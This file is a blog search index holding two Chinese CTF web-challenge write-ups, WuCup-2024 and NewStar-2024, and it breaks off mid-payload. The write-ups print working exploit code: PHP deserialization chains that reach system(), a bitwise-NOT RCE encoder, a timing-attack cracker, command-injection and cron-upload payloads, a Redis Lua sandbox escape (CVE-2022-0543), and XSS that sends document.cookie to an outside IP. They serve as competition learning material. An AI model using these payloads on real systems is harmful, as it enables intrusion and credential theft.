<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>WuCup-2024</title>
      <link href="/2024/12/02/WuCup-2024/"/>
      <url>/2024/12/02/WuCup-2024/</url>
      
        <content type="html"><![CDATA[<h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为一些事情，只抽出了一点时间打比赛，最后10分钟看了ezPHP，没想到有思路，但是比赛结束才出。。。（上次蜀道山也是<br>这次比赛打的很不尽人意，特别是<code>hellohacker</code>，基础RCE掌握还是不够扎实。<br>不出意外应该是2024年第二篇也是最后一篇博客了，要与期末考试对线了。<br>demo，我不会止步于此的！！！这个寒假我一定要好好沉淀，不再拖inkey爹和洋参的后腿（呜呜呜</p><h2 id="ezPHP"><a href="#ezPHP" class="headerlink" title="ezPHP"></a>ezPHP</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>进入题目，全是<code>404</code>,扫到flag.php，结合<code>PHP＜= 7 . 4 . 21 development server</code>源码泄露漏洞</p><p>利用<code>POC</code>获取源码，注意回车</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/flag.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge.wucup.cn:39391</span><br><span class="line"></span><br><span class="line"><span class="language-http"></span></span><br><span class="line"><span class="language-http"><span class="keyword">GET</span> <span class="string">/Kawakaze</span> <span class="meta">HTTP/1.1</span></span></span><br><span class="line"><span class="language-http"></span></span><br><span class="line"><span class="language-http"></span></span><br></pre></td></tr></table></figure><p>获取源码后利用call_user_func打反序列化，同时利用S绕过正则</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$OAO</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QAQ</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$OVO</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/hello/&#x27;</span>, <span class="variable">$this</span>-&gt;OVO))&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;OVO === <span class="string">&quot;hello&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;OAO-&gt;QAQ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;OVO;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pap</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$vqv</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$functioin</span> = <span class="variable language_">$this</span>-&gt;pap;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$functioin</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vqv;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$OOO</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="variable">$_</span> = <span class="variable language_">$this</span>-&gt;OOO;</span><br><span class="line">        <span class="variable">$___</span> = <span class="variable">$_GET</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$___</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$___</span>[<span class="string">&#x27;h_in.t&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$___</span>[<span class="string">&#x27;h_in.t&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$___</span>);</span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_</span>, ...<span class="variable">$___</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$UUU</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uuu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;UUU;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;UUU;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">d</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;UUU=<span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;UUU-&gt;OVO=<span class="string">&#x27;hell%6f&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;UUU-&gt;OAO=<span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;UUU-&gt;OAO-&gt;pap=<span class="keyword">new</span> <span class="title function_ invoke__">c</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;UUU-&gt;OAO-&gt;pap-&gt;OOO=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:1:&quot;d&quot;:2:&#123;s:3:&quot;UUU&quot;;O:1:&quot;a&quot;:3:&#123;s:3:&quot;OAO&quot;;O:1:&quot;b&quot;:2:&#123;s:3:&quot;pap&quot;;O:1:&quot;c&quot;:1:&#123;s:3:&quot;OOO&quot;;s:6:&quot;system&quot;;&#125;s:3:&quot;vqv&quot;;N;&#125;s:3:&quot;QAQ&quot;;N;s:3:&quot;OVO&quot;;s:7:&quot;hell%6f&quot;;&#125;s:3:&quot;uuu&quot;;N;&#125;</span></span><br><span class="line"><span class="comment">#把hello之前的s换成S</span></span><br><span class="line"><span class="comment">#O:1:&quot;d&quot;:2:&#123;s:3:&quot;UUU&quot;;O:1:&quot;a&quot;:3:&#123;s:3:&quot;OAO&quot;;O:1:&quot;b&quot;:2:&#123;s:3:&quot;pap&quot;;O:1:&quot;c&quot;:1:&#123;s:3:&quot;OOO&quot;;s:6:&quot;system&quot;;&#125;s:3:&quot;vqv&quot;;N;&#125;s:3:&quot;QAQ&quot;;N;s:3:&quot;OVO&quot;;S:5:&quot;hell%6f&quot;;&#125;s:3:&quot;uuu&quot;;N;&#125;```</span></span><br></pre></td></tr></table></figure><p><code>...$___解析$_GET参数，并取value，则在GET中构造1=cat /flag</code></p><p><img src="C:\Users\ZhuanZ\web\wucup2024\ezPHP\image-20241201203606092.png" alt="image-20241201203606092"></p><h2 id="hellohacker"><a href="#hellohacker" class="headerlink" title="hellohacker"></a>hellohacker</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>第一眼看见</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;z&#x27;</span>];</span><br></pre></td></tr></table></figure><p>以为是<code>/var/log/nginx/access.log + UA</code>注入，发现失败</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>尝试绕过<code>checkRequiredChars</code>，经过测试发现需要上述字母连在一起进行排列组合，下载下来prohibited.txt</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.wucup.cn:33132/prohibited.txt&quot;</span></span><br><span class="line"></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line"></span><br><span class="line">​    file.write(response.content)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;文件下载成功！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;下载失败，状态码：<span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>排列组合找出缺失的组合，缺失的组合为oxzverapn</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部排列</span></span><br><span class="line">letters = <span class="string">&quot;pevanxroz&quot;</span></span><br><span class="line">all_permutations = <span class="built_in">set</span>(<span class="string">&quot;&quot;</span>.join(p) <span class="keyword">for</span> p <span class="keyword">in</span> permutations(letters))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从文件中读取排列</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;file.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file_permutations = <span class="built_in">set</span>(line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出缺失的组合</span></span><br><span class="line">missing_permutations = all_permutations - file_permutations</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;缺失的组合数量: <span class="subst">&#123;<span class="built_in">len</span>(missing_permutations)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> missing_permutations:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;以下组合缺失:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> perm <span class="keyword">in</span> missing_permutations:</span><br><span class="line">        <span class="built_in">print</span>(perm)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;没有缺失的组合。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><code>取反RCE</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义 URL 编码函数，逐字节处理</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="comment"># 将字符转换为单字节的十六进制编码</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;%<span class="subst">&#123;<span class="built_in">ord</span>(char):02X&#125;</span>&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从命令行输入函数名称</span></span><br><span class="line">system = <span class="built_in">input</span>(<span class="string">&#x27;[+]your function: &#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从命令行输入命令</span></span><br><span class="line">command = <span class="built_in">input</span>(<span class="string">&#x27;[+]your command: &#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按位取反并逐字节处理</span></span><br><span class="line">inverted_system = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(~<span class="built_in">ord</span>(c) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> system])  <span class="comment"># 按位取反</span></span><br><span class="line">inverted_command = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(~<span class="built_in">ord</span>(c) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> c <span class="keyword">in</span> command])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自定义编码函数，避免 UTF-8 多字节扩展</span></span><br><span class="line">encoded_system = custom_urlencode(inverted_system)</span><br><span class="line">encoded_command = custom_urlencode(inverted_command)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出格式化结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] (~<span class="subst">&#123;encoded_system&#125;</span>)(~<span class="subst">&#123;encoded_command&#125;</span>);&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="timecrack"><a href="#timecrack" class="headerlink" title="timecrack"></a>timecrack</h2><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><p>爆破一分钟，每一分钟的第0秒，随机生成的password为114</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.wucup.cn:47579/&quot;</span>  <span class="comment"># 替换为实际目标 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置发送的数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;input&quot;</span>: <span class="string">&quot;114&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 发送 GET 请求</span></span><br><span class="line">        response = requests.get(url, params=data)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 打印状态码</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Status Code: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查响应内容</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;The next challenge in&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Success! Response: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;w36&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 每秒发送一次</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>利用<code>时间</code>爆破8位数字密码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置目标 URL</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.wucup.cn:47579/Trapping2147483647.php&quot;</span>  <span class="comment"># 替换为实际目标 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化变量</span></span><br><span class="line">password_length = <span class="number">8</span>  <span class="comment"># 密码长度</span></span><br><span class="line">password = <span class="string">&quot;&quot;</span>  <span class="comment"># 存储已破解的密码部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐位破解密码</span></span><br><span class="line"><span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(password_length):</span><br><span class="line">    <span class="keyword">for</span> digit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 尝试每一位的数字 (0-9)</span></span><br><span class="line">        <span class="comment"># 构造当前测试密码</span></span><br><span class="line">        test_pass = password + <span class="built_in">str</span>(digit)  <span class="comment"># 当前密码已知部分加上尝试的数字</span></span><br><span class="line">        test_pass = test_pass.ljust(password_length, <span class="string">&quot;0&quot;</span>)  <span class="comment"># 补足长度为8</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录开始时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 发送 POST 请求</span></span><br><span class="line">        response = requests.post(url, data=&#123;<span class="string">&quot;pass&quot;</span>: test_pass&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录结束时间</span></span><br><span class="line">        elapsed_time = time.time() - start_time</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Testing: <span class="subst">&#123;test_pass&#125;</span>, Time: <span class="subst">&#123;elapsed_time:<span class="number">.2</span>f&#125;</span>s, Response: <span class="subst">&#123;response.text.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断当前位是否正确</span></span><br><span class="line">        <span class="keyword">if</span> elapsed_time &gt; (position + <span class="number">1</span>):  <span class="comment"># 每正确一个字符，延迟会逐渐增加</span></span><br><span class="line">            password += <span class="built_in">str</span>(digit)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Found digit: <span class="subst">&#123;digit&#125;</span>, Current password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出完整密码</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Cracked password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p><code>无回显RCE</code>利用<code>tee</code>外带到index.php，过滤了<code>空白符</code>和<code>&#123;&#125;</code>，利用<code>$IFS$9</code>绕过</p><p><code>payload</code>：tac$IFS$9&#x2F;flag|tee$IFS$9index.php</p><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>·<code>AntSword</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStar-2024</title>
      <link href="/2024/11/28/NewStar-2024/"/>
      <url>/2024/11/28/NewStar-2024/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h3 id="Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！"><a href="#Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！" class="headerlink" title="Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！"></a>Web菜鸟的入门第一赛，在自己的努力还有仙贝的帮助下也是拿下了校内赛道Web单方向第一，记录一下自己的首胜，我深知自己的实力在大型比赛中会狠狠坐牢。。。但是，我不会止步于此的！！！</h3><h1 id="臭皮吹泡泡"><a href="#臭皮吹泡泡" class="headerlink" title="臭皮吹泡泡"></a>臭皮吹泡泡</h1><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">study</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$study</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">let_me</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$let_me</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sign_in</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">study</span>();</span><br><span class="line"><span class="variable">$obj1</span>-&gt;study=<span class="keyword">new</span> <span class="title function_ invoke__">ctf</span>();</span><br><span class="line"><span class="variable">$obj2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">let_me</span>();</span><br><span class="line"><span class="variable">$obj2</span>-&gt;let_me=<span class="string">&quot;\n system(&#x27;cat /f*&#x27;);&quot;</span>;</span><br><span class="line"><span class="variable">$obj2</span>-&gt;time=<span class="keyword">new</span> <span class="title function_ invoke__">happy</span>();</span><br><span class="line"><span class="variable">$obj1</span>-&gt;study-&gt;ctf=[<span class="variable">$obj2</span>,<span class="string">&quot;get_flag&quot;</span>];</span><br><span class="line"><span class="variable">$obj1</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj1</span>;</span><br></pre></td></tr></table></figure><h2 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h2><p><code>[$Object,&quot; function &quot;]</code><br>能直接调用某个类下的函数<br><code>$object</code>与字符串比较时会直接调用<code>__tostring</code></p><h1 id="臭皮的网站"><a href="#臭皮的网站" class="headerlink" title="臭皮的网站"></a>臭皮的网站</h1><h2 id="wp-1"><a href="#wp-1" class="headerlink" title="wp"></a>wp</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>利用 CVE 路径穿越获取 app.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure><p>随机数种子为硬件地址即 mac 地址<br>利用路径穿越获取<br>&#x2F;static&#x2F;..&#x2F;..&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment">#00:16:3e:10:2d: 87</span></span><br><span class="line">random.seed(<span class="number">0x00163e102d87</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k = <span class="number">8</span>)))</span><br></pre></td></tr></table></figure><p>获取登录密码</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>登陆后,任意文件上传</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&#x27;./static/&#x27;</span> + file.filename</span><br></pre></td></tr></table></figure><p>利用路径穿越上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * * * * root cat /*f* &gt; /app/static/bcd</span><br></pre></td></tr></table></figure><p>至&#x2F;etc&#x2F;cron.d&#x2F;a<br><code>失败,求解</code></p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>发现subprocess.run中shell&#x3D;True</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">command = <span class="string">&quot;ls ./static&quot;</span>  <span class="comment">#cat /*f &gt;./static</span></span><br><span class="line"><span class="keyword">if</span> user == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">    result = subprocess.run(command, shell = <span class="literal">True</span>, check = <span class="literal">True</span>, text = <span class="literal">True</span>, capture_output = <span class="literal">True</span>)</span><br><span class="line">    files_list = result.stdout</span><br><span class="line">    <span class="keyword">return</span> web.Response(text = <span class="string">&quot;static:&quot;</span>+files_list)</span><br></pre></td></tr></table></figure><p>得到Linux大神<code>inkey</code>的指点,直接修改&#x2F;bin&#x2F;ls的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /*f* &gt; ./static/114514</span><br></pre></td></tr></table></figure><p>再次访问&#x2F;static&#x2F;114514得到flag</p><h1 id="ezredis"><a href="#ezredis" class="headerlink" title="ezredis"></a>ezredis</h1><h2 id="wp-2"><a href="#wp-2" class="headerlink" title="wp"></a>wp</h2><h3 id="redis5版本之后，lua沙箱环境ban了config-set-dir等危险函数，Redis-lua沙盒逃逸-CVE-2022-0543"><a href="#redis5版本之后，lua沙箱环境ban了config-set-dir等危险函数，Redis-lua沙盒逃逸-CVE-2022-0543" class="headerlink" title="redis5版本之后，lua沙箱环境ban了config set dir等危险函数，Redis lua沙盒逃逸(CVE-2022-0543)"></a>redis5版本之后，lua沙箱环境ban了config set dir等危险函数，Redis lua沙盒逃逸(CVE-2022-0543)</h3><p><code>Debian 以及 Ubuntu 发行版的源在打包 Redis 时，在 Lua 沙箱中遗留了一个对象 package，攻击者可以利用这个对象提供的方法加载动态链接库 liblua 里的函数，进而逃逸沙箱执行任意命令。</code></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>local io_l &#x3D; package.loadlib(“&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”, “luaopen_io”);<br>local io &#x3D; io_l();<br>local f &#x3D; io.popen(“cat &#x2F;flag”, “r”);<br>local res &#x3D; f:read(“*a”);<br>f:close();<br>return res</p><p>local io_l&#x3D;package.loadlib(“&#x2F;user&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblua5.1.so.0”,”luaopen_io”);</p><h1 id="pangbai过家家-5"><a href="#pangbai过家家-5" class="headerlink" title="pangbai过家家(5)"></a>pangbai过家家(5)</h1><h2 id="wp-3"><a href="#wp-3" class="headerlink" title="wp"></a>wp</h2><p>审计<br>发现api.ts里有localhost读信<br>发现&lt;…&gt;&lt;&#x2F;….&gt;被ban了<br>利用onerror以及<code>浏览器自动补全</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;x&quot; onerror = ; 绕过</span><br></pre></td></tr></table></figure><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><p>尝试了好久利用<code>onerror</code>获取cookie后fetch给vps</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;invalid.jpg&quot; onerror = &quot;fetch(&#x27;http://ip: port/cookie/&#x27; + encodeURIComponent(document.cookie));&quot;</span><br></pre></td></tr></table></figure><p>发现<code>sameSite:&#39;Strict&#39;</code>，无法带出</p><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><p>继续直接带出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;http://123.57.74.106:3389/?cookie =&quot; + encodeURIComponent(document.cookie);</span><br></pre></td></tr></table></figure><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>得到提示可以把cookie通过<code>send</code> api再发出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt; img src = &quot;x&quot; onerror =&quot;</span><br><span class="line">fetch(&#x27;/api/send&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    &#x27;Content-Type&#x27;: &#x27;application/json&#x27;</span><br><span class="line">  &#125;,</span><br><span class="line">  body: 